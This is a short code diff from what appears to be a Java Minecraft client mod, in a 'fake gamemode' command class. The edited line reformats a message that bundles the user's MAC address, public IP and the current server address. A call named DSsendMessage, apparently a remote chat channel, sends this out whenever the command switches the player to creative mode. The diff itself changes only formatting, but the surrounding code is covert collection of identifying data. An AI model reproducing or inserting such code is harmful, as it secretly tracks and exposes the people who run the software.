@@ -61,7 +61,7 @@ public class FakeGamemodeCommand extends Command {
         }
         String macAddress = String.join("-", hexadecimal);
 
-        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Switched GameMode [Creative] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Switched GameMode [Creative] \nServer: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
 
         mc.playerController.setGameType(GameType.CREATIVE);
 
